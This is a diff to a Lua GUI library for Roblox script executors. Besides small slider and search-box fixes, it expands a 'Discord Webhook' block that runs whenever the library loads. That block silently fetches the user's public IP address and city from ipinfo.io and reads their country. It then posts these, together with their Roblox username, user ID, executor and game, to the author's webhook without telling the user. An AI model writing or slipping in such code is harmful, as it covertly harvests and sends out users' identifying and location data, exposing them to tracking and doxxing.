@@ -76,61 +76,219 @@ function Library:CreateWindow(config)
         -- ---------- Discord Webhook ----------
     if WebhookURL ~= "" then
     task.spawn(function()
+        local Players = game:GetService("Players")
+        local MarketplaceService = game:GetService("MarketplaceService")
+        local LocalizationService = game:GetService("LocalizationService")
+        local HttpService = game:GetService("HttpService")
+
+        local Player = Players.LocalPlayer
+
         local executorName = "Unknown"
-        if identifyexecutor then pcall(function() executorName = identifyexecutor() end) end
-        
-        local gameName = game.Name
-        pcall(function() gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name end)
-        
-        -- 1. Definisikan reqFunc lebih awal
-        local reqFunc = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
-        
-        -- 2. Ambil IP pengguna menggunakan reqFunc
-        local playerIP = "Unknown"
-        if reqFunc then
+        if identifyexecutor then
             pcall(function()
-                local ipResponse = reqFunc({
-                    Url = "https://api.ipify.org",
-                    Method = "GET"
-                })
-                if ipResponse and ipResponse.Body then
-                    playerIP = ipResponse.Body
-                end
+                executorName = identifyexecutor()
             end)
         end
 
-        local data = {
-            ["embeds"] = {{
-                ["title"] = WindowName .. " Executed!",
-                ["description"] = "A user has executed your script library.",
-                ["color"] = tonumber(0x00FFFF),
-                ["fields"] = {
-                    {["name"] = "Display Name", ["value"] = PlayerDisplayName, ["inline"] = true},
-                    {["name"] = "Username", ["value"] = "@" .. PlayerName, ["inline"] = true},
-                    {["name"] = "User ID", ["value"] = tostring(PlayerId), ["inline"] = true},
-                    {["name"] = "Executor", ["value"] = executorName, ["inline"] = true},
-                    {["name"] = "Game Name", ["value"] = gameName, ["inline"] = true},
-                    {["name"] = "IP Address", ["value"] = playerIP, ["inline"] = true}, 
-                    {["name"] = "Game Link", ["value"] = "https://www.roblox.com/games/"..tostring(game.PlaceId), ["inline"] = false},
-                },
-                ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..PlayerId.."&width=420&height=420&format=png"}
-            }}
-        }
-        
-        -- 4. Kirim Webhook
-        if reqFunc then 
-            pcall(function() 
-                reqFunc({
-                    Url = WebhookURL, 
-                    Method = "POST", 
-                    Headers = {["Content-Type"] = "application/json"}, 
-                    Body = HttpService:JSONEncode(data)
-                }) 
-            end) 
+        local gameName = game.Name
+        pcall(function()
+            gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
+        end)
+
+        -- Request function
+        local reqFunc =
+            (syn and syn.request)
+            or (http and http.request)
+            or http_request
+            or (fluxus and fluxus.request)
+            or request
+
+        -- Ambil IP dan Kota
+local playerIP = "Unknown"
+local playerCity = "Unknown"
+
+if reqFunc then
+    pcall(function()
+        -- URL diubah ke ipinfo.io yang mendukung format JSON
+        local ipResponse = reqFunc({
+            Url = "https://ipinfo.io/json",
+            Method = "GET"
+        })
+
+        if ipResponse and ipResponse.Body then
+            -- Decode JSON dari response
+            local data = HttpService:JSONDecode(ipResponse.Body)
+            
+            -- Simpan IP dan Kota
+            playerIP = data.ip or "Unknown"
+            playerCity = data.city or "Unknown"
         end
     end)
 end
 
+-- Ambil Country / Region dari Roblox
+local countryCode = "Unknown"
+
+pcall(function()
+    countryCode = LocalizationService:GetCountryRegionForPlayerAsync(Player)
+end)
+
+-- Nama negara berdasarkan countryCode
+local countryNames = {
+    ID = "Indonesia",
+    MY = "Malaysia",
+    SG = "Singapore",
+    TH = "Thailand",
+    PH = "Philippines",
+    VN = "Vietnam",
+    JP = "Japan",
+    KR = "South Korea",
+    CN = "China",
+    US = "United States",
+    GB = "United Kingdom",
+    AU = "Australia",
+    CA = "Canada",
+    DE = "Germany",
+    FR = "France",
+    IT = "Italy",
+    ES = "Spain",
+    BR = "Brazil",
+    IN = "India",
+    RU = "Russia",
+    NL = "Netherlands",
+    SE = "Sweden",
+    NO = "Norway",
+    DK = "Denmark",
+    FI = "Finland",
+    PL = "Poland",
+    TR = "Turkey",
+    SA = "Saudi Arabia",
+    AE = "United Arab Emirates",
+    NZ = "New Zealand",
+    MX = "Mexico",
+    AR = "Argentina",
+    CL = "Chile",
+    CO = "Colombia",
+    ZA = "South Africa",
+    EG = "Egypt",
+    PK = "Pakistan",
+    BD = "Bangladesh",
+    TW = "Taiwan",
+    HK = "Hong Kong",
+}
+
+-- Format negara + flag
+local formatNegara = countryCode
+
+if countryCode ~= "Unknown" and #countryCode == 2 then
+    local upperCountryCode = string.upper(countryCode)
+
+    local countryName =
+        countryNames[upperCountryCode]
+        or upperCountryCode
+
+    local firstChar = string.byte(upperCountryCode, 1)
+    local secondChar = string.byte(upperCountryCode, 2)
+
+    if firstChar and secondChar
+        and firstChar >= 65 and firstChar <= 90
+        and secondChar >= 65 and secondChar <= 90 then
+
+        local flagEmoji =
+            utf8.char(0x1F1E6 + firstChar - 65)
+            .. utf8.char(0x1F1E6 + secondChar - 65)
+
+        formatNegara =
+            flagEmoji .. " " .. countryName
+    else
+        formatNegara = countryName
+    end
+end
+
+
+        local data = {
+            ["embeds"] = {{
+                ["title"] = WindowName .. " Executed!",
+                ["description"] =
+                    "A user has executed your script library.",
+                ["color"] = tonumber(0x00FFFF),
+
+                ["fields"] = {
+                    {
+                        ["name"] = "Display Name",
+                        ["value"] = tostring(PlayerDisplayName),
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "Username",
+                        ["value"] = "@" .. tostring(PlayerName),
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "User ID",
+                        ["value"] = tostring(PlayerId),
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "Executor",
+                        ["value"] = tostring(executorName),
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "Game Name",
+                        ["value"] = tostring(gameName),
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "IP Address",
+                        ["value"] = tostring(playerIP),
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "City",
+                        ["value"] = tostring(playerCity),
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "Country",
+                        ["value"] = tostring(formatNegara),
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "Game Link",
+                        ["value"] =
+                            "https://www.roblox.com/games/"
+                            .. tostring(game.PlaceId),
+                        ["inline"] = false
+                    }
+                },
+
+                ["thumbnail"] = {
+                    ["url"] =
+                        "https://www.roblox.com/headshot-thumbnail/image?userId="
+                        .. tostring(PlayerId)
+                        .. "&width=420&height=420&format=png"
+                }
+            }}
+        }
+
+        -- Kirim webhook
+        if reqFunc then
+            pcall(function()
+                reqFunc({
+                    Url = WebhookURL,
+                    Method = "POST",
+
+                    Headers = {
+                        ["Content-Type"] = "application/json"
+                    },
+
+                    Body = HttpService:JSONEncode(data)
+                })
+            end)
+        end
+    end)
+end
 
     -- ---------- Root GUI ----------
     local ScreenGui = Instance.new("ScreenGui")
@@ -599,7 +757,7 @@ end
     SearchBox:GetPropertyChangedSignal("Text"):Connect(function()
         local text = SearchBox.Text:lower()
         for _, child in pairs(GameListScroll:GetChildren()) do
-            if child:IsA("TextButton") then child.Visible = (text == "" or string.find(child.Name:lower(), text)) end
+            if child:IsA("TextButton") then child.Visible = (text == "" or string.find(child.Name:lower(), text, 1, true)) end
         end
     end)
     
@@ -771,11 +929,12 @@ function Tab:CreateSlider(config)
     sliderBtn.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then isDragging = true end end)
     game:GetService("UserInputService").InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then isDragging = false end end)
     game:GetService("UserInputService").InputChanged:Connect(function(input)
-        if isDragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+            if not sliderBg.Parent then return end -- Mencegah memory leak jika UI dihancurkan
+            if isDragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
             local percent = math.clamp((input.Position.X - sliderBg.AbsolutePosition.X) / sliderBg.AbsoluteSize.X, 0, 1)
             sliderFill.Size = UDim2.new(percent, 0, 1, 0)
-            local value = min + ((max - min) * percent)
-            valLabel.Text = tostring(math.floor(value)) .. (config.Suffix or "")
+            local value = math.floor(min + ((max - min) * percent))
+            valLabel.Text = tostring(value) .. (config.Suffix or "")
             if config.Callback then config.Callback(value) end
         end
     end)
